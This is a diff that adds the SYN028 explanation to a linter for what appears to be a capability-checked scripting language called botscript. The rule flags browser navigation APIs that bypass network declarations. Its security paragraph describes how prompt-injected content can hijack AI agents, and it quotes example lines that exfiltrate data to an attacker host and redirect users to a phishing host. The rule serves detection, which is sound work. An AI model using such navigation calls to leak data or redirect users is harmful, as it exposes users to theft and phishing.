@@ -1386,6 +1386,50 @@ export const EXPLANATIONS: Readonly<Record<string, Explanation>> = {
         "}\n",
     },
   },
+  SYN028: {
+    code: "SYN028",
+    title: "fn uses a navigation API that bypasses the net capability model (?bs 0.7+)",
+    body:
+      "SYN028 fires when a fn body uses a browser navigation API at `?bs 0.7+`:\n\n" +
+      "- `window.open(url, ...)`, `globalThis.open(url, ...)`, `self.open(url, ...)` — opens a " +
+      "new browsing context and issues an HTTP request to `url`; the URL is sent to the network.\n" +
+      "- `location.href = url` — triggers a full-page navigation; equivalent to a GET request.\n" +
+      "- `location.assign(url)`, `location.replace(url)` — navigation calls with/without history entry.\n" +
+      "- `location.reload()` — reissues the current request.\n\n" +
+      "None of these are covered by `uses { net }`, `reads {}`, or `writes {}` — they are " +
+      "invisible to botscript's capability model. A fn that calls them has an undeclared network " +
+      "dependency: callers cannot see it, and tests cannot intercept or mock the navigation.\n\n" +
+      "**Security angle:** In bot/agent contexts, prompt-injected content can call " +
+      "`location.href = 'https://phishing.example.com'` or `window.open('https://attacker.example.com/exfil?data=...')` " +
+      "to redirect users to phishing pages or exfiltrate data as URL parameters. These are harder " +
+      "to intercept than `fetch()` — no ServiceWorker intercepts navigations by default, and " +
+      "CSP `connect-src` does not cover `navigate-to` unless explicitly combined.\n\n" +
+      "**Excluded:** `obj.location.*` (location as a member of a local binding, not the global), " +
+      "`obj.window.open` (non-ambient receiver), fn/function/function* declarations named `location` " +
+      "or `open`, method shorthands. `unsafe {}` blocks and `unsafe \"reason\" fn` bodies are suppressed.",
+    example: {
+      fails:
+        "?bs 0.7\n" +
+        "// SYN028: location.href assignment bypasses the capability model\n" +
+        "fn redirectTo(url: string) -> void {\n" +
+        "  location.href = url\n" +
+        "}\n\n" +
+        "// SYN028: window.open opens a new context without net declaration\n" +
+        "fn openTab(url: string) -> void {\n" +
+        "  window.open(url, '_blank')\n" +
+        "}\n",
+      passes:
+        "?bs 0.7\n" +
+        "// fix: pass navigation as a parameter\n" +
+        "fn redirectTo(navigate: (url: string) -> void, url: string) -> void {\n" +
+        "  navigate(url)\n" +
+        "}\n\n" +
+        "// or use unsafe when navigation is genuinely required at an entry point\n" +
+        "fn navigateToLogin(url: string) -> void {\n" +
+        "  unsafe \"redirects to login page\" { location.href = url }\n" +
+        "}\n",
+    },
+  },
   DEP001: {
     code: "DEP001",
     title: "fn transitively reads a resource category not declared in its header",
